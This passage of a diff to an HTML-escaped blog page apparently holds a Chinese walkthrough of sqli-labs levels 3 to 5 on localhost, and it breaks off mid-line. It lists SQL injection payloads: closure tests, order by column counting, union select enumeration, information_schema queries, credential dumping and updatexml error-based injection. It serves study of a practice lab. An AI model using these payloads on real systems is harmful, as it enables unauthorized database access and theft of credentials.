 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://localhost/sqli-labs/Less-3/?id=1&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163104.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313163104&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163104.png&#34; alt=&#34;Pasted image 20250313163104&#34;&gt;&lt;br&gt;
 4.构造&lt;code&gt;?id=1&#39;) order by 3 --+&lt;/code&gt;通过order by子句来判断该数据表的字段数&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1956,16 +1179,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;![[Pasted image 20250313163156.png]]&lt;br&gt;
 构造&lt;code&gt;?id=1&#39;) order by 4 --+&lt;/code&gt;页面报错，由此可知该表&lt;strong&gt;字段数为3&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163217.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313163217&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163217.png&#34; alt=&#34;Pasted image 20250313163217&#34;&gt;&lt;br&gt;
 5.构造&lt;code&gt;?id=-1&#39;) union select 1,2,3 --+&lt;/code&gt;判断出回显点为该&lt;strong&gt;表的第二、三字段&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1985,16 +1199,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163513.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313163513&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163513.png&#34; alt=&#34;Pasted image 20250313163513&#34;&gt;&lt;br&gt;
 7.构造&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2005,16 +1210,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;在数据库information_schema中的tables表里查询出security数据库的表有：&lt;strong&gt;emails,referers,uagents,users&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163605.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313163605&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163605.png&#34; alt=&#34;Pasted image 20250313163605&#34;&gt;&lt;br&gt;
 8.构造&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2036,52 +1232,16 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;strong&gt;爆出所有的用户名和密码&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165344.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313165344&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;less-4&#34;&gt;Less-4
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;验证注入点：双引号报错，两个双引号闭合利用闭合方式：&lt;code&gt;&amp;quot;) &amp;lt;payload&amp;gt; --+&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165344.png&#34; alt=&#34;Pasted image 20250313165344&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;less-4&#34;&gt;Less-4&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;验证注入点：双引号报错，两个双引号闭合利用闭合方式：&lt;code&gt;&amp;quot;) &amp;lt;payload&amp;gt; --+&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;
 也是闭合符号不一样&lt;br&gt;
 1.进入第四题，显示&lt;code&gt;Please input the ID as parameter with numeric value&lt;/code&gt;，告诉了我们参数为&lt;strong&gt;id&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165443.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313165443&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165443.png&#34; alt=&#34;Pasted image 20250313165443&#34;&gt;&lt;br&gt;
 2.构造&lt;code&gt;?id=1&lt;/code&gt;,页面显示正常&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165519.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313165519&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165519.png&#34; alt=&#34;Pasted image 20250313165519&#34;&gt;&lt;br&gt;
 3.接下来加个双引号，显示语句出错，根据报错信息可以得知参数&lt;code&gt;id&lt;/code&gt;的值被&lt;strong&gt;双引号和括号&lt;/strong&gt;包裹&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165632.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313165632&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165632.png&#34; alt=&#34;Pasted image 20250313165632&#34;&gt;&lt;br&gt;
 4.构造&lt;code&gt;?id=1&amp;quot;) order by 3 --+&lt;/code&gt;通过order by子句来判断该数据表的字段数,页面显示正常&lt;br&gt;
 构造&lt;code&gt;?id=1&amp;quot;) order by 4 --+&lt;/code&gt;页面报错，由此可知该表字段数为3&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -2092,27 +1252,9 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://localhost/sqli-labs/Less-4/?id=1&amp;#34;) order by 3 --+
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165810.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313165810&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165810.png&#34; alt=&#34;Pasted image 20250313165810&#34;&gt;&lt;br&gt;
 5.构造&lt;code&gt;?id=-1&amp;quot;) union select 1,2,3 --+&lt;/code&gt;判断出回显点为该&lt;strong&gt;表的第二、三字段&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165912.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313165912&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165912.png&#34; alt=&#34;Pasted image 20250313165912&#34;&gt;&lt;br&gt;
 6.构造&lt;code&gt;?id=-1&amp;quot;) union select 1,2,database() --+&lt;/code&gt;知道了&lt;strong&gt;数据库名为security&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2133,16 +1275,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;在数据库information_schema中的tables表里查询出security数据库的表有：&lt;strong&gt;emails,referers,uagents,users&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170137.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313170137&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170137.png&#34; alt=&#34;Pasted image 20250313170137&#34;&gt;&lt;br&gt;
 8.构造&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2153,16 +1286,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;在数据库information_schema中的columns里查找出&lt;strong&gt;数据库security中的users表的全部字段&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170217.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313170217&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170217.png&#34; alt=&#34;Pasted image 20250313170217&#34;&gt;&lt;br&gt;
 9.构造&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2173,30 +1297,12 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;strong&gt;爆出所有的用户名和密码&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170255.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313170255&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;less-5&#34;&gt;Less-5
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;验证注入点：单引号报错，两个单引号闭合利用闭合方式：&lt;code&gt;&#39; &amp;lt;payload&amp;gt; --+&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170255.png&#34; alt=&#34;Pasted image 20250313170255&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;less-5&#34;&gt;Less-5&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;验证注入点：单引号报错，两个单引号闭合利用闭合方式：&lt;code&gt;&#39; &amp;lt;payload&amp;gt; --+&lt;/code&gt;&lt;br&gt;
 考察点：报错注入&lt;/strong&gt;&lt;br&gt;
 1.进入第五题，显示&lt;code&gt;Please input the ID as parameter with numeric value&lt;/code&gt;，告诉了我们参数为&lt;strong&gt;id&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170335.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313170335&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170335.png&#34; alt=&#34;Pasted image 20250313170335&#34;&gt;&lt;br&gt;
 2.构造&lt;code&gt;?id=1&lt;/code&gt;,页面显示&lt;code&gt;You are in...........&lt;/code&gt;，不再像前4题显示&lt;code&gt;name&lt;/code&gt;和&lt;code&gt;passwd&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2206,16 +1312,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://localhost/sqli-labs/Less-5/?id=1
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170403.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313170403&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170403.png&#34; alt=&#34;Pasted image 20250313170403&#34;&gt;&lt;br&gt;
 3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数&lt;strong&gt;id&lt;/strong&gt;的值被&lt;strong&gt;单引号&lt;/strong&gt;包裹&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2225,16 +1322,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://localhost/sqli-labs/Less-5/?id=1&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170450.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313170450&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170450.png&#34; alt=&#34;Pasted image 20250313170450&#34;&gt;&lt;br&gt;
 4.构造&lt;code&gt;?id=1‘ order by 1 --+&lt;/code&gt;通过order by子句来判断该数据表的字段数，页面显示正常&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2244,16 +1332,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://localhost/sqli-labs/Less-5/?id=1&amp;#39; order by 1 --+
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170613.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313170613&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170613.png&#34; alt=&#34;Pasted image 20250313170613&#34;&gt;&lt;br&gt;
 构造&lt;code&gt;?id=1&#39; order by 3 --+&lt;/code&gt;页面显示正常&lt;br&gt;
 构造&lt;code&gt;?id=1&#39; order by 4 --+&lt;/code&gt;页面报错，由此可知该表&lt;strong&gt;字段数为3&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -2264,16 +1343,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170613.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313170613&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170613.png&#34; alt=&#34;Pasted image 20250313170613&#34;&gt;&lt;br&gt;
 5.构造&lt;code&gt;?id=-1&#39; union select 1,2,3 --+&lt;/code&gt;判断回显点，结果发现行不通&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2283,16 +1353,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170713.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313170713&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170713.png&#34; alt=&#34;Pasted image 20250313170713&#34;&gt;&lt;br&gt;
 6.构造&lt;code&gt;?id=1&#39; and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) --+&lt;/code&gt;发现可以进行盲注&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2302,16 +1363,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;updatexml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()),&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span 